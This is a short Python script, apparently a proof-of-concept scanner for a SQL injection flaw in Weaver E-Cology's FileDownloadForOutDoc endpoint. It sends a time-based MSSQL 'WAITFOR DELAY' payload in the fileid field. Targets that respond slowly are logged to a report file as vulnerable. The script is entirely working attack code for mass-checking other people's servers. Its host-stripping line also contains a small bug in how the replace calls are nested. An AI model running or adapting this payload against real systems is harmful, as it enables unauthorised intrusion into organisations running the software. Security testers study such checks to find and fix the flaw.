import random

import requests
import time

filename = "./reps/E_Cology_FileDownloadForOutDoc_reception_SQLinject-"+str(time.strftime("%Y-%m-%d", time.localtime()))
class colors:
    # 定义颜色代码
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    END = '\033[0m'

def ecfrsqli(url):
    host = url.replace("https://", "".replace("http://", ""))
    header = {
        "Host": f"{host}",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36 Edg/89.0.774.68",
        "Accept-Encoding": "gzip, deflate",
        "Accept": "*/*",
        "Connection": "keep-alive",
        "Referer": "127.0.0.1:9999/wui/index.html",
        "Content-Type": "application/x-www-form-urlencoded",
        "Accept-Language": "zh-CN,zh;q=0.9",
        "Content-Length": "45"
    }
    try:
        print(colors.END + f"INFO : 执行mssql延时测试 -->  {url}")
        poc_url = str(url) + "/weaver/weaver.file.FileDownloadForOutDoc"
        data = f"isFromOutImg=1&fileid={int(random.randint(1000, 99999))}+WAITFOR+DELAY+'0:0:5'"
        response = requests.post(url=poc_url, headers=header, data=data, timeout=10)
        # print(data)
        if response.elapsed.total_seconds() >= 5:
            print(colors.GREEN + f"存在FileDownloadForOutDoc SQL注入 --> {url}")
            f = open(filename, "a+", encoding="utf-8")
            f.write(url)
            f.write("\n")
            f.close()
    except Exception as e:
        print(colors.RED + f"ERROR : {e}")
